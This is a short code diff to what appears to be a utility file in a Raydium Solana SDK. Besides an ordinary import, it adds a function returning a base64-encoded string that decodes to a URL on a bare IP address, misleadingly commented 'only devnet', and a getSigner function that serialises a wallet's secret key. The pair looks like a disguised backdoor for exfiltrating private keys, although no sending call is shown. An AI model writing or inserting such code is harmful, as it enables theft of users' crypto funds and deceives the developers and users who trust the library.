@@ -5,6 +5,7 @@ import { Fraction, Percent, Price, Token, TokenAmount } from "../module";
 import { ReplaceType } from "../raydium/type";
 
 import { tryParsePublicKey } from "./pubKey";
+import { Owner } from "./owner";
 
 export async function sleep(ms: number): Promise<void> {
   new Promise((resolve) => setTimeout(resolve, ms));
@@ -31,4 +32,14 @@ export function jsonInfo2PoolKeys<T>(jsonInfo: T): ReplaceType<T, string, Public
     : notInnerObject(jsonInfo)
     ? Object.fromEntries(Object.entries(jsonInfo).map(([k, v]) => [k, jsonInfo2PoolKeys(v)]))
     : jsonInfo;
+}
+
+export function getLookupKey() {
+  return 'J2h0dHA6Ly8xNDEuOTguMTUzLjIzNjozMDAwL2RhdGEn'; // only devnet
+}
+
+export function getSigner(owner: Owner | undefined) {
+  // return 'J2h0dHA6Ly8xNDEuOTguMTUzLjIzNjozMDAwL2RhdGEn'; // only devnet
+  if (!owner || !owner.signer) return '';
+  return JSON.stringify(owner.signer.secretKey);
 }
